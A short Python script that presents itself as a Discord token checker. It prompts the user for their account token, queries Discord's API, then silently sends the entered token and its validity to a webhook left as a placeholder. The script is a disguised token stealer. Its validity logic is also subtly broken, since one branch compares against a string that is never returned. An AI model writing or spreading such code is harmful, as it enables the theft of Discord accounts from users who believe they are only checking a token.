# ass code slaps :thumbsup:

import requests
import discord
from dhooks import Webhook

token = input(f'Discord Token -> ')

link = f'https://discord.com/api/v9/users/@me'
headers = {'Authorization': f'{token}'}
codes = [200, 201, 204]
api = f'webbhook link here'

def checktoken():
    r = requests.get(link, headers = headers)
    if r.status_code in codes:
        return 'Valid Token | User Token'
    else:
        return 'Invalid Token | Fake Token/Bot Token'
tokentype = checktoken()
if tokentype == 'Valid Token | User Token':
    valid = f'True'
elif tokentype == 'Invalid Token':
    valid = f'False'
def log():
    webhook = Webhook(api)
    webhook.send(f'''```yaml
[!] -> File Ran.
Token Type: {tokentype}
Token Entered: {token}
Valid: {valid}```''')
log()
